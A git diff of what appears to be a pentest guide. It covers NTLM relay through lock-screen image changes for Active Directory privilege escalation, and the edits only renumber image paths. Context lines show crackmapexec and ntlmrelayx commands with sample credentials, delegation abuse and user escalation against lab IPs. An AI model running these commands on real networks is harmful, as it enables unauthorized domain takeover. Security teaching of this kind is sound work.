@@ -22,7 +22,7 @@ Install-WindowsFeature WebDAV-Redirector –Restart
 
 3\. Click on "Allow an app or feature through Windows Defender Firewall"
 
-![](<../../../../.gitbook/assets/image (2) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (2) (1) (1) (1).png>)
 
 4\. Select "File and Printer sharing" and click on "OK"
 
@@ -64,7 +64,7 @@ Abuse the lockscreen image changing functionality to achieve a webdav network au
 crackmapexec ldap 10.0.0.5 -u richard -p Sample123 -M MAQ
 ```
 
-![](<../../../../.gitbook/assets/image (9) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)
 
 The machine account qouta is 10, meaning we (all authenticated users) can create our own computerobject in the domain.
 
@@ -94,7 +94,7 @@ We now have all our prerequisites. Time to escalate our privileges.
 python3 /opt/impacket/examples/ntlmrelayx.py -t ldap://10.0.0.3 --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg
 ```
 
-![](<../../../../.gitbook/assets/image (34) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (34) (1) (1) (1).png>)
 
 5\. Run the Change-LockScreen tool in the shell of WS01 and check the ntlmrelay output. The Change-LockScreen command will give an error but this doesn't matter:
 
